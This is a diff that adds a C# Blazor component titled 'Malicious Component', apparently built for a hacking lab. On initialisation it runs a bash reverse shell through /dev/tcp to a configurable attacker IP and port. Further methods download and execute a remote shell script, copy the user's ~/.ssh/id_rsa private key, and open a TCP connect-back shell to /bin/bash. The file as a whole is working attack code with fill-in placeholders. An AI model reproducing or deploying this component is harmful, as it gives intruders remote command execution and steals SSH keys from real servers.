@@ -1,0 +1,152 @@
+@using System;
+@using System.IO;
+@using System.Net;
+@using System.Diagnostics;
+@using System.Net.Sockets
+@using System.Text
+@using Microsoft.AspNetCore.Components;
+@using Microsoft.AspNetCore.Components.Rendering;
+@using Microsoft.AspNetCore.Components.Web;
+
+<h3>Malicious Component</h3>
+
+@code {
+
+    // private async Task DownloadFileFromStream()
+    // {
+    //     var fileStream = GetFileStream();
+    //     var fileName = "log.bin";
+
+    //     using var streamRef = new DotNetStreamReference(stream: fileStream);
+
+    //     await JS.InvokeVoidAsync("downloadFileFromStream", fileName, streamRef);
+    // }
+
+    private const string IP = "10.10.14.69";  // Update with your client IP.
+    private const int PORT = 1337;  // Either the webserver hosting your revershell or what the revershell will call back to.
+    private const string User = "YOUR_SUSPECTED_USERNAME";
+    private const string SourceFilePath = $"/home/{User}/.ssh/id_rsa";
+    private const string TargetDirectory = "YOUR_TARGET_DIRECTORY";
+    private const string ReverseShellFilename = "revshell.sh";
+
+    private StreamWriter streamWriter;
+
+    protected override void OnInitialized()
+    {
+        //DownloadReverseShell();
+        //ExecuteReverseShell();
+        //ExfiltrateFile();
+        ReverseBashShell();
+        //TcpClientConnectBack();
+    }
+
+    private void DownloadReverseShell()
+    {
+        string fileUrl = $"http://{IP}:{PORT}/{ReverseShellFilename}";
+        string localPath = ReverseShellFilename;
+        // using var client = new WebClient();
+        // client.DownloadFile(fileUrl, localPath);
+
+        using var httpClient = new HttpClient();
+        var request = new HttpRequestMessage(HttpMethod.Get, fileUrl);
+        var response = httpClient.Send(request);
+
+        if (response.StatusCode == HttpStatusCode.OK)
+        {
+            // Save the file
+            using Stream responseStream = response.Content.ReadAsStream();
+            using FileStream fileStream = new FileStream(localPath, FileMode.Create, FileAccess.Write);
+
+            // Read the response stream in chunks
+            byte[] buffer = new byte[4096];
+            int bytesRead;
+            while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
+            {
+                fileStream.Write(buffer, 0, bytesRead);
+            }
+        }
+    }
+
+    private void ExecuteReverseShell()
+    {
+        Process.Start("chmod", $"+x ./{ReverseShellFilename}").WaitForExit();
+        Process.Start($"./{ReverseShellFilename}");
+    }
+
+    private Stream GetFileStream()
+    {
+        return File.OpenRead(SourceFilePath);
+    }
+
+    private void ExfiltrateFile()
+    {
+        File.Copy(SourceFilePath, TargetDirectory + Path.GetFileName(SourceFilePath), true);
+    }
+
+
+    private void TcpClientConnectBack()
+    {
+        using var client = new TcpClient(IP, PORT);
+        using var stream = client.GetStream();
+        using var rdr = new StreamReader(stream);
+        streamWriter = new StreamWriter(stream);
+
+        var strInput = new StringBuilder();
+
+        var p = new Process();
+        p.StartInfo.FileName = "/bin/bash";
+        p.StartInfo.CreateNoWindow = true;
+        p.StartInfo.UseShellExecute = false;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.StartInfo.RedirectStandardInput = true;
+        p.StartInfo.RedirectStandardError = true;
+        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+        p.Start();
+        p.BeginOutputReadLine();
+
+        while (true)
+        {
+            strInput.Append(rdr.ReadLine());
+            //strInput.Append("\n");
+            p.StandardInput.WriteLine(strInput);
+            strInput.Remove(0, strInput.Length);
+        }
+    }
+
+
+    private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+    {
+        var strOutput = new StringBuilder();
+
+        if (!string.IsNullOrWhiteSpace(outLine.Data))
+        {
+            try
+            {
+                strOutput.Append(outLine.Data);
+                streamWriter.WriteLine(strOutput);
+                streamWriter.Flush();
+            }
+            catch (Exception err) { }
+        }
+    }
+
+
+    private void ReverseBashShell()
+    {
+        var proc = new Process();
+        proc.StartInfo.FileName = "/bin/bash";
+        proc.StartInfo.Arguments = $"-c \"/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\"";
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.RedirectStandardOutput = true;
+        proc.Start();
+
+        while (!proc.StandardOutput.EndOfStream)
+        {
+            Console.WriteLine(proc.StandardOutput.ReadLine());
+        }
+    }
+
+
+
+
+}
